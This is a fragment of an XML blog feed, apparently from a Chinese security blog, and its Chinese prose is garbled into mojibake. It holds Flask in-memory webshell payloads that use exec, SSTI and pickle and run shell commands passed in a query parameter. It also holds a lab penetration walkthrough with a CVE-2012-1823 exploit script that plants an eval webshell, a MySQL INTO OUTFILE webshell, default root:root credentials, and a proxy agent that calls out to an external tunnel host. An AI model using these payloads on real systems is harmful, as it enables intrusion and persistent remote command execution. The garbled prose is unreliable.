src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810012603684.png" alt="image-20240810012603684"></p><p>å‘ç°çœ¼ç†Ÿçš„ä¸œè¥¿ï¼Œå½“ç„¶æŒ‰ç…§æ—§ç‰ˆå†…å­˜é©¬çš„æ–¹å¼ç›´æ¥è°ƒç”¨<code>register_error_handler</code>åŒæ ·æ˜¯ä¸è¡Œçš„</p><p>ä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œä¼ å…¥<code>register_error_handler</code>çš„å‚æ•°æœ‰<code>code_or_exception</code>å’Œ<code>f</code></p><p><code>f</code>ä¾æ—§æ˜¯æˆ‘ä»¬å¯æ§çš„å‡½æ•°ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯è¦æ„é€ <code>code_or_exception</code>ä½¿å¾—<code>code</code>å’Œ<code>exc_class</code>ä¹Ÿå¯æ§ï¼Œåœ¨å‰é¢<code>code_or_exception</code>çš„å€¼ä¸º404</p><p>è·Ÿè¿›ä¸€ä¸‹<code>_get_exc_class_and_code</code></p><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810013648894.png" alt="image-20240810013648894"></p><p>é‚£è¿™è¿˜æ„é€ ä¸ªå•¥ï¼Œç›´æ¥<code>_get_exc_class_and_code(404)</code>ï¼Œè¿™æ ·å°±èƒ½è¿”å›å¸¸è§„çš„å˜é‡äº†</p><p>payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810014235559.png" alt="image-20240810014235559"></p><hr><h2 id="sstiåˆ©ç”¨"><a href="#sstiåˆ©ç”¨" class="headerlink" title="sstiåˆ©ç”¨"></a>sstiåˆ©ç”¨</h2><p>è€ƒè™‘åˆ°ä¸Šä¸‹æ–‡æ²¡æœ‰å¯¼å…¥åŒ…çš„æƒ…å†µ</p><p>æ³¨ï¼šéƒ¨åˆ†flaskç‰ˆæœ¬ä¸‹æ— æ³•ä½¿ç”¨<code>url_for.__globals__[&#39;current_app&#39;]</code>æ¥è·å–appï¼Œå› æ­¤è¿™é‡Œæ”¹ç”¨<code>sys.modules</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810011718358.png" alt="image-20240810011718358"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"exec(\"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()\")"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="pickleåˆ©ç”¨"><a href="#pickleåˆ©ç”¨" class="headerlink" title="pickleåˆ©ç”¨"></a>pickleåˆ©ç”¨</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"__import__(\"sys\").modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda :__import__('os').popen(request.args.get('cmd')).read())"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>b <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"__import__('sys').modules['__main__'].__dict__['app'].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>b <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>b <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å¹´è½»äººå­¦çš„ç¬¬ä¸€ä¸ªå†…å­˜é©¬ï¼Œç«Ÿç„¶ä¸æ˜¯javaï¼ˆ&lt;/p&gt;
&lt;p&gt;çœ‹å¤§ä¼™å¥½åƒå‰å‡ ä¸ªæœˆéƒ½åœ¨ç ”ç©¶è¿™ä¸ªï¼Œå­¦ä¸€ä¸‹ï¼Œé¡ºå¸¦å¤å¥ä¸€ä¸‹ï¼Œå·²ç»æ‘¸äº†ä¸¤å‘¨ğŸŸäº†&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/iceyhexman/flask_memory_shell&quot;&gt;https://github.com/iceyhexman/flask_memory_shell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/&quot;&gt;http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/&quot;&gt;https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/14421&quot;&gt;https://xz.aliyun.com/t/14421&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/gxngxngxn/p/18181936&quot;&gt;https://www.cnblogs.com/gxngxngxn/p/18181936&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="flask" scheme="http://c1oudfl0w0.github.io/blog/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>æŸæ¸—é€ï¼ˆ1ï¼‰</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/</id>
    <published>2024-07-25T09:06:04.000Z</published>
    <updated>2024-07-29T16:23:32.175Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™æ˜¯ä»€ä¹ˆï¼ŸNISAå†…éƒ¨é¶åœºï¼Œæ‰“ä¸€ä¸‹</p><span id="more"></span><hr><h1 id="å¼€å±€â€”â€”Shiro"><a href="#å¼€å±€â€”â€”Shiro" class="headerlink" title="å¼€å±€â€”â€”Shiro"></a>å¼€å±€â€”â€”Shiro</h1><p>å¼€å±€è¿›å…¥é¶æœº</p><p>å‘ç°æ˜¯ä¸€ä¸ªshiroæœåŠ¡</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725172148296.png" alt="image-20240725172148296"></p><p>ç›´æ¥å·¥å…·çˆ†ç ´ä¸€æŠŠæ¢­</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725172229146.png" alt="image-20240725172229146"></p><p>èšå‰‘è¿æ¥jspé©¬</p><p>flagåœ¨&#x2F;flag.txtï¼š<code>WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7eb5b33e961c&#125;</code></p><p>ä¸Šä¼ fscanå¼€æ‰«ç½‘æ®µ</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725170928581.png" alt="image-20240725170928581"></p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725171037365.png" alt="image-20240725171037365"></p><p>result.txt</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">192.168.100.2:9000 open192.168.100.3:8080 open192.168.100.1:8080 open192.168.100.1:443 open192.168.100.2:80 open192.168.100.1:80 open192.168.100.1:22 open192.168.100.1:21 open[*] WebTitle https://192.168.100.1     code:502 len:552    title:502 Bad Gateway[*] WebTitle http://192.168.100.1      code:404 len:548    title:404 Not Found[+] FCGI 192.168.100.2:9000 Status: 403 ForbiddenX-Powered-By: PHP/7.3.33Content-type: text/html; charset=UTF-8Access denied.stderr:Access to the script '/etc/issue' has been denied (see security.limit_extensions)plesa try other path,as -path /www/wwwroot/index.php[+] ftp 192.168.100.1:21:anonymous [*] WebTitle http://192.168.100.3:8080 code:302 len:0      title:None è·³è½¬url: http://192.168.100.3:8080/login;jsessionid=88A50ABBF8DA8065B091061A4A4A9FEB[*] WebTitle http://192.168.100.2      code:200 len:382    title:None[*] WebTitle http://192.168.100.1:8080 code:302 len:0      title:None è·³è½¬url: http://192.168.100.1:8080/login;jsessionid=AA897C0EA332974F6AE4F884E3375F6F[*] WebTitle http://192.168.100.1:8080/login;jsessionid=AA897C0EA332974F6AE4F884E3375F6F code:200 len:2608   title:Login Page[*] WebTitle http://192.168.100.3:8080/login;jsessionid=88A50ABBF8DA8065B091061A4A4A9FEB code:200 len:2608   title:Login Page[+] PocScan http://192.168.100.2 poc-yaml-php-cgi-cve-2012-1823 [+] PocScan http://192.168.100.1:8080/ poc-yaml-shiro-key [&#123;key kPH+bIxk5D2deZiIxcaaaA==&#125; &#123;mode cbc&#125;][+] PocScan http://192.168.100.3:8080/ poc-yaml-shiro-key [&#123;key kPH+bIxk5D2deZiIxcaaaA==&#125; &#123;mode cbc&#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™é‡Œçš„shiroå’ŒtpæœåŠ¡éƒ½å¼€äº†ä¸¤ä¸ªip</p><hr><h1 id="å†…ç½‘ä»£ç†ç¬¬ä¸€å±‚"><a href="#å†…ç½‘ä»£ç†ç¬¬ä¸€å±‚" class="headerlink" title="å†…ç½‘ä»£ç†ç¬¬ä¸€å±‚"></a>å†…ç½‘ä»£ç†ç¬¬ä¸€å±‚</h1><p>åœ¨shiroé¶æœºä¸Šä¼ stowawayçš„ linux_x64_agent è¿›è¡Œå†…ç½‘ä»£ç†ï¼Œæˆ‘è¿™é‡Œç”¨æœ¬æœºå†…ç½‘ç©¿é€ä½œä¸ºå…¬ç½‘ip</p><p>åœ¨æ§åˆ¶ç«¯ä¸Šæ‰§è¡Œï¼ˆæˆ‘ç©¿é€å‡ºå»æ˜¯30908ç«¯å£ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">windows_x64_admin.exe <span class="token parameter variable">-l</span> <span class="token number">666</span> <span class="token parameter variable">-s</span> <span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨è¦è¢«ä»£ç†çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./linux_x64_agent <span class="token parameter variable">-c</span> 7c61c35132.vicp.fun:30908 <span class="token parameter variable">-s</span> <span class="token number">123</span> <span class="token parameter variable">--reconnect</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725171738901.png" alt="image-20240725171738901"></p><p>åœ¨æœ¬æœºçš„6666ç«¯å£åšsocksä»£ç†</p><p>æµè§ˆå™¨è®¾ç½®å¯¹åº”çš„ipå’Œç«¯å£è¿›è¡Œä»£ç†</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725171822820.png" alt="image-20240725171822820"></p><p>æ¥ä¸‹æ¥ç›´æ¥è®¿é—®å†…ç½‘ipå³å¯</p><hr><h1 id="thinkphp-or-fastcgi"><a href="#thinkphp-or-fastcgi" class="headerlink" title="thinkphp or fastcgi"></a>thinkphp or fastcgi</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[+] PocScan http://192.168.100.2 poc-yaml-php-cgi-cve-2012-1823 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‚è€ƒphp-cgi-cve-2012-1823ï¼š<a href="https://github.com/0xl0k1/CVE-2012-1823">https://github.com/0xl0k1/CVE-2012-1823</a></p><p>ä¸Šä¼ php_cgi.shåˆ°shiroé¶æœºï¼Œç›´æ¥è·‘è„šæœ¬</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725174534196.png" alt="image-20240725174534196"></p><p>æ¥ä¸‹æ¥ä¿®æ”¹ä¸€ä¸‹shè„šæœ¬ï¼Œä¸Šé©¬</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">function</span> <span class="token function-name function">ctrl_c</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>[!] Exiting..."</span>  <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token builtin class-name">trap</span> ctrl_c SIGINT<span class="token comment">#if [ $# -ne 2 ]; then</span><span class="token comment">#    echo -e "\n[!] Usage: $0 &lt;RHOST> \"&lt;COMMAND>\""</span><span class="token comment">#    echo -e "\nExample: $0 http://10.128.20.2 \"whoami\"\n"</span><span class="token comment">#    exit 1</span><span class="token comment">#fi</span><span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token assign-left variable">command</span><span class="token operator">=</span><span class="token variable">$2</span><span class="token function-name function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">#payload="&lt;?php system('$command'); die(); ?>"</span>    <span class="token assign-left variable">payload</span><span class="token operator">=</span><span class="token string">"&lt;?php file_put_contents('hack.php','&lt;?php eval(\<span class="token variable">$_POST</span>[1]);'); die(); ?>"</span>    <span class="token builtin class-name">echo</span>    <span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-X</span> POST <span class="token string">"<span class="token variable">$rhost</span>/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$payload</span>"</span> --connect-timeout <span class="token number">10</span>        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$?</span> <span class="token parameter variable">-ne</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">echo</span> <span class="token string">"[!] Exploit failed!"</span>    <span class="token keyword">fi</span><span class="token punctuation">&#125;</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»™èšå‰‘æŒ‚socksä»£ç†ï¼Œç„¶åè¿æ¥</p><p>ä¼ fscan</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725180319718.png" alt="image-20240725180319718"></p><p>å¼€æ‰«</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725180502883.png" alt="image-20240725180502883"></p><p>å‘ç°æ–°çš„å†…ç½‘ipæ®µ10.85.101.4</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">10.85.101.4:80 open10.85.101.3:80 open10.85.101.1:80 open10.85.101.1:22 open10.85.101.4:9000 open10.85.101.3:9000 open10.85.101.2:6379 open10.85.101.1:21 open10.85.101.1:443 open[+] ftp 10.85.101.1:21:anonymous [*] WebTitle https://10.85.101.1       code:502 len:552    title:502 Bad Gateway[+] FCGI 10.85.101.3:9000 Status: 403 ForbiddenX-Powered-By: PHP/7.3.33Content-type: text/html; charset=UTF-8Access denied.stderr:Access to the script '/etc/issue' has been denied (see security.limit_extensions)plesa try other path,as -path /www/wwwroot/index.php[*] WebTitle http://10.85.101.1        code:404 len:548    title:404 Not Found[+] FCGI 10.85.101.4:9000 Status: 403 ForbiddenX-Powered-By: PHP/8.2.8Content-type: text/html; charset=UTF-8Access denied.[*] WebTitle http://10.85.101.3        code:200 len:382    title:None[*] WebTitle http://10.85.101.4        code:200 len:19411  title:phpMyAdmin[+] InfoScan http://10.85.101.4        [phpMyAdmin] [+] PocScan http://10.85.101.3 poc-yaml-php-cgi-cve-2012-1823 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="å†…ç½‘ä»£ç†ç¬¬äºŒå±‚"><a href="#å†…ç½‘ä»£ç†ç¬¬äºŒå±‚" class="headerlink" title="å†…ç½‘ä»£ç†ç¬¬äºŒå±‚"></a>å†…ç½‘ä»£ç†ç¬¬äºŒå±‚</h1><p>åœ¨tpé¶æœºä¸Šé¢ä¼ å…¥stowawayå¼€å§‹ç¬¬äºŒå±‚ä»£ç†</p><p>åœ¨æˆ‘ä»¬ä¸»æœºæ§åˆ¶ç«¯ä¸Šé¢ä¾æ¬¡è¾“å…¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use <span class="token number">0</span>listen<span class="token number">1</span><span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725181725911.png" alt="image-20240725181725911"></p><p>è¿™æ ·å­å°±åœ¨shiroé¶æœºä¸Šå»ºç«‹äº†ä¸€ä¸ªç›‘å¬1234ç«¯å£çš„è¿æ¥</p><p>ç„¶ååœ¨tpé¶æœºä¸Šè¿æ¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./linux_x64_agent <span class="token parameter variable">-c</span> <span class="token number">192.168</span>.100.3:1234 <span class="token parameter variable">-s</span> <span class="token number">123</span> <span class="token parameter variable">--reconnect</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725181934329.png" alt="image-20240725181934329"></p><p>æ­¤æ—¶èŠ‚ç‚¹+1</p><p>ç„¶åå†å»ºç«‹socksä»£ç†</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725182134496.png" alt="image-20240725182134496"></p><p>åœ¨6667ç«¯å£</p><hr><h1 id="phpMyAdmin"><a href="#phpMyAdmin" class="headerlink" title="phpMyAdmin"></a>phpMyAdmin</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[*] WebTitle http://10.85.101.4        code:200 len:19411  title:phpMyAdmin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>äºæ˜¯è®¿é—®phpMyAdminï¼Œå¼±å¯†ç </p><p>æœåŠ¡ä¸è´¦å¯†ï¼š<code>localhost:root:root</code></p><p>åœ¨flagæ•°æ®åº“ä¸­æ‰¾åˆ°flagï¼š<code>WSS-Studio&#123;Mysql-08a451ad-3869-4eeb-81b3-22fa354b8aa9&#125;</code></p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725183552068.png" alt="image-20240725183552068"></p><p>æ¥ä¸‹æ¥å°è¯•getshell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">'%secure%'</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725183841583.png" alt="image-20240725183841583"></p><blockquote><p>å½“<code>secure_file_priv</code>çš„å€¼ä¸º<code>null</code> ï¼Œè¡¨ç¤ºé™åˆ¶MySQL ä¸å…è®¸å¯¼å…¥|å¯¼å‡º<br>å½“<code>secure_file_priv</code>çš„å€¼ä¸º<code>/tmp/</code> ï¼Œè¡¨ç¤ºé™åˆ¶MySQL çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨&#x2F;tmp&#x2F;ç›®å½•ä¸‹<br>å½“<code>secure_file_priv</code>çš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹ MySQL çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶</p></blockquote><p>å¯ä»¥ç›´æ¥å†™é©¬</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;?php eval($_POST[1]); ?>'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/hack.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725184023330.png" alt="image-20240725184023330"></p><p>å¾—åˆ°flagï¼š<code>WSS-Studio&#123;phpMyAdmin-ab21820c-a53d-4d7a-93aa-86d70a4a776b&#125;</code></p><p>èšå‰‘è¿ä¸Šï¼Œifconfig å‘ç°æ–°çš„å†…ç½‘ipæ®µ172.56.102.3ï¼Œä¼ fscanæ‰«å†…ç½‘</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">172.56.102.3:80 open172.56.102.1:80 open172.56.102.1:22 open172.56.102.3:9000 open172.56.102.4:8080 open172.56.102.2:5432 open172.56.102.1:21 open172.56.102.1:443 open172.56.102.4:8009 open[+] FCGI 172.56.102.3:9000 Status: 403 ForbiddenX-Powered-By: PHP/8.2.8Content-type: text/html; charset=UTF-8Access denied.[+] ftp 172.56.102.1:21:anonymous [*] WebTitle http://172.56.102.4:8080  code:200 len:90     title:$Title$[*] WebTitle http://172.56.102.1       code:404 len:548    title:404 Not Found[*] WebTitle https://172.56.102.1      code:502 len:552    title:502 Bad Gateway[*] WebTitle http://172.56.102.3       code:200 len:19411  title:phpMyAdmin[+] Postgres:172.56.102.2:5432:postgres password[+] 